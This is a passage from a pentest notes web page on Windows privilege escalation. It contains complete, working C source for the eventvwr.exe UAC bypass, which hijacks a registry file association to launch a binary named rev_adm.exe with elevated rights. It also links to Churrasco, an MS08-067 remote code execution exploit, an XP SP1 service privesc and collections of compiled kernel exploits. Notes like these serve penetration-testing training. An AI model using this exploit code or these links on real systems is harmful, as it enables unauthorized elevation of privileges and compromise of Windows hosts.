            <span class="hljs-keyword">if</span> (!RegDelnodeRecurse(lpSubKey)) <span class="hljs-keyword">break</span>;
            lResult = RegEnumKeyEx(hKey, <span class="hljs-number">0</span>, szName, &amp;dwSize, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, &amp;ftWrite);
        } <span class="hljs-keyword">while</span> (lResult == ERROR_SUCCESS);
    }

    lpEnd--;
    *lpEnd = TEXT(<span class="hljs-string">&apos;\0&apos;</span>);

    RegCloseKey(hKey);

        <span class="hljs-keyword">return</span> RegDeleteKey(HKEY_CURRENT_USER, lpSubKey) == ERROR_SUCCESS;
}

<span class="hljs-comment">/*
 * Wrapper for above
 */</span>

<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">RegDelnode</span><span class="hljs-params">()</span> </span>{
    TCHAR szDelKey[MAX_PATH*<span class="hljs-number">2</span>] = <span class="hljs-string">&quot;Software\\Classes\\mscfile&quot;</span>;
    <span class="hljs-keyword">return</span> RegDelnodeRecurse(szDelKey);
}

<span class="hljs-keyword">void</span> __c_exploitUAC() {
        <span class="hljs-keyword">char</span> curPath[MAX_PATH], evtVwr[MAX_PATH];
        HKEY attackKey;
        SHELLEXECUTEINFO exInfo;

        <span class="hljs-comment">/*
        curPath is the command you want to elevate.
        Below is an example that shows how to elevate
        foobar.exe sitting in the same path as this
        program.
        */</span>

        GetCurrentDirectory(MAX_PATH, curPath);
        <span class="hljs-comment">/*
        Set the program to execute here. It must be placed in the same directory
        */</span>
        <span class="hljs-built_in">strcat</span>(curPath, <span class="hljs-string">&quot;\\rev_adm.exe&quot;</span>);

        <span class="hljs-built_in">sprintf</span>(evtVwr, <span class="hljs-string">&quot;%s\\System32\\eventvwr.exe&quot;</span>, getenv(<span class="hljs-string">&quot;SYSTEMROOT&quot;</span>));

        <span class="hljs-keyword">if</span>(!RegDelnode()) <span class="hljs-keyword">return</span>;
        <span class="hljs-keyword">if</span>(RegCreateKey(HKEY_CURRENT_USER, <span class="hljs-string">&quot;Software\\Classes\\mscfile\\shell\\open\\command&quot;</span>, &amp;attackKey)!=ERROR_SUCCESS) <span class="hljs-keyword">return</span>;

        RegSetValueEx(attackKey, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-number">0</span>, REG_SZ, curPath, <span class="hljs-built_in">strlen</span>(curPath));

        exInfo.lpVerb       = <span class="hljs-string">&quot;open&quot;</span>;
        exInfo.lpFile       = evtVwr;
        exInfo.nShow        = <span class="hljs-number">0</span>;
        exInfo.fMask        = SEE_MASK_NOCLOSEPROCESS;
        exInfo.cbSize       = <span class="hljs-keyword">sizeof</span>(SHELLEXECUTEINFO);
        exInfo.hwnd         = <span class="hljs-number">0</span>;
        exInfo.lpParameters = <span class="hljs-number">0</span>;
        exInfo.lpDirectory  = <span class="hljs-number">0</span>;
        exInfo.hInstApp     = <span class="hljs-number">0</span>;

        ShellExecuteEx(&amp;exInfo);

        Sleep(<span class="hljs-number">5000</span>);

        TerminateProcess(exInfo.hProcess, <span class="hljs-number">0</span>);

        RegCloseKey(attackKey);
        RegDelnode();
}

<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span> </span>{
        __c_exploitUAC();
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<ul>
<li><a href="https://ivanitlearning.wordpress.com/2019/07/07/bypassing-default-uac-settings-manually/" target="_blank">https://ivanitlearning.wordpress.com/2019/07/07/bypassing-default-uac-settings-manually/</a></li>
<li><a href="https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/" target="_blank">https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/</a></li>
</ul>
<h1 id="churrasco">Churrasco</h1>
<p>On <code>Windows Server 2003</code> with  and impersonation token privileges (Tokens kiddnapping revenge), use <code>churrasco</code>: <a href="https://github.com/Re4son/Churrasco/raw/master/churrasco.exe" target="_blank">https://github.com/Re4son/Churrasco/raw/master/churrasco.exe</a></p>
<p>It will execute a given command with <code>SYSTEM</code> privileges.</p>
<h1 id="ms08-067">MS08-067</h1>
<p>On <code>Windows XP</code>, <code>Windows 2000</code> and <code>Windows 2003</code> MS08-067 can allow remote code execution.
<a href="https://github.com/andyacer/ms08_067" target="_blank">https://github.com/andyacer/ms08_067</a></p>
<h1 id="windows-xp">Windows XP</h1>
<h2 id="sp1">SP1</h2>
<p>Privilege escalation through <code>upnphost</code> and <code>SSDPSRV</code></p>
<ul>
<li><a href="https://sohvaxus.github.io/content/winxp-sp1-privesc.html" target="_blank">https://sohvaxus.github.io/content/winxp-sp1-privesc.html</a></li>
</ul>
<h1 id="ressources">Ressources</h1>
<ul>
<li>Some <code>Windows</code> exploit : <a href="https://github.com/nickvourd/oscp_methodology" target="_blank">https://github.com/nickvourd/oscp_methodology</a></li>
<li>Compiled kernel exploit : <a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank">https://github.com/SecWiki/windows-kernel-exploits</a></li>
</ul>
<h1 id="ressources">Ressources</h1>
<ul>
<li><code>T.Diot</code> github : <a href="https://github.com/Qazeer/InfoSec-Notes/blob/master/Windows/Local_privilege_escalation.md" target="_blank">https://github.com/Qazeer/InfoSec-Notes/blob/master/Windows/Local_privilege_escalation.md</a></li>
</ul>

                                
                                </section>
                            
    </div>
    <div class="search-results">
        <div class="has-results">
            
            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
            <ul class="search-results-list"></ul>
            
        </div>
        <div class="no-results">
            
            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
            
        </div>
    </div>
</div>

    </div>
    <div class="search-results">
        <div class="has-results">
            
            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
            <ul class="search-results-list"></ul>
            
        </div>
        <div class="no-results">
            
            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
            
        </div>
    </div>
</div>

                        </div>
                    </div>
                
            </div>

            
                
                
                <a href="Linux.html" class="navigation navigation-next navigation-unique" aria-label="Next page: Linux">
                    <i class="fa fa-angle-right"></i>
                </a>
                
            
        
    </div>

    <script>
        var gitbook = gitbook || [];
        gitbook.push(function() {
            gitbook.page.hasChanged({"page":{"title":"Windows","level":"1.5.4.14.1","depth":4,"next":{"title":"Linux","level":"1.5.4.14.2","depth":4,"path":"Pentest/Techniques/Privileges escalation/Linux.md","ref":"Pentest/Techniques/Privileges escalation/Linux.md","articles":[]},"previous":{"title":"Privilege Escalation","level":"1.5.4.14","depth":3,"ref":"","articles":[{"title":"Windows","level":"1.5.4.14.1","depth":4,"path":"Pentest/Techniques/Privileges escalation/Windows.md","ref":"Pentest/Techniques/Privileges escalation/Windows.md","articles":[]},{"title":"Linux","level":"1.5.4.14.2","depth":4,"path":"Pentest/Techniques/Privileges escalation/Linux.md","ref":"Pentest/Techniques/Privileges escalation/Linux.md","articles":[]}]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["-sharing","collapsible-chapters@git+https://gitlab.dqr/gitbook-plugin/collapsible-chapters.git#main","copy-code-button@git+https://gitlab.dqr/gitbook-plugin/copy-code-button.git#main","hide-published-with","search-plus","simple-page-toc"],"pluginsConfig":{"github":{"url":"https://github.com/YoannDqr"},"simple-page-toc":{"maxDepth":3,"skipFirstH1":true},"search":{},"collapsible-chapters":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"hide-published-with":{},"fontsettings":{"theme":"white","family":"sans","size":2},"twitter":{"url":"https://twitter.com/HackerOtter"},"highlight":{},"copy-code-button":{},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"search-plus":{}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"Pentest/Techniques/Privileges escalation/Windows.md","mtime":"2023-05-14T19:07:17.500Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2024-07-13T09:30:58.053Z"},"basePath":"../../..","book":{"language":""}});
        });
    </script>
</div>

        
    <script src="../../../gitbook/gitbook.js"></script>
    <script src="../../../gitbook/theme.js"></script>
    
        
        <script src="../../../gitbook/gitbook-plugin-collapsible-chapters/collapsible-chapters.js"></script>
        
    
        
        <script src="../../../gitbook/gitbook-plugin-copy-code-button/toggle.js"></script>
        
    
        
        <script src="../../../gitbook/gitbook-plugin-hide-published-with/plugin.js"></script>
        
    
        
        <script src="../../../gitbook/gitbook-plugin-search-plus/jquery.mark.min.js"></script>
        
    
        
        <script src="../../../gitbook/gitbook-plugin-search-plus/search.js"></script>
        
    
        
        <script src="../../../gitbook/gitbook-plugin-search/search-engine.js"></script>
        
    
        
        <script src="../../../gitbook/gitbook-plugin-search/search.js"></script>
        
    
        
        <script src="../../../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
        
    
        
        <script src="../../../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
        
    
        
        <script src="../../../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
        
    

    </body>
</html>

